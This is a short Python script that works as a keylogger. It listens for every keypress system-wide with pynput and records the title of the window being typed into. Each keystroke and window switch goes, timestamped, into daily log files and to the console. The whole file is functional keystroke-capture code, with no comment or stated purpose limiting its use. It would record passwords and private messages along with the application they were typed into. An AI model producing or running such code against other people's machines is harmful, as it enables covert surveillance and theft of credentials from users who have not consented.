from pynput import keyboard
from time import gmtime, strftime
import pygetwindow as gw

last_window= None
def save_to_file(data):
    with open(f"logs/{strftime("%Y-%m-%d", gmtime())}.txt", "a", encoding= "utf-8") as file:
        file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')

    
def on_press(key):
    global last_window
    active_window= gw.getActiveWindowTitle()
    if active_window != last_window:
        save_to_file(f"Switched to: {active_window}")
        print(f"Switched to: {active_window}")
        last_window= active_window
    print(f"Typed: {key}")
    save_to_file(f"Typed: {key}")



with keyboard.Listener(
    on_press= on_press
) as listener:
    listener.join()